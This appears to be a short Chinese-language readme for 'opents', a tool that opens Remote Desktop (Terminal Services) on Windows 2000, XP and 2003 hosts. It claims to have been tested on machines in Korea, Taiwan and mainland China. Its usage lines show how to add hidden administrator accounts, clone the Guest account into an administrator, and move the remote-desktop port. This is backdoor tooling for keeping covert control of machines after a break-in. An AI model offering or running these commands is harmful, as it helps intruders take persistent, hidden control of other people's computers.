经测试，可开韩国，台湾，大陆等的主机！
可开启包括：win2000服务器版 winXP专业版 win2003服务版
而且可以判断是否需要重起机器！XP与2003 不用重起！


使用说明：
      

opents               (直接运行默认开3389端口)
opents PORT          (带PORT数字参数运行，开启自定义端口的终端)
opents -h(/?)        (参数 -h 或 /? 显示帮助与查看终端端口)
opents -s PORT       (参数 -s 用于重新设置终端端口)
opents -a USER PASS  (参数 -a 用于增加隐藏的管理员帐号，USER PASS都自定义)
opents -l            (参数 -l 用于列举系统中的所有用户名与SID值)
opents -d USER       (参数 -d 用于删除用户，特别是克隆的用户与隐藏的管理员用户)
opents -c PASS       (参数 -c 用于把GUEST克隆成管理员用户，密码自定义)
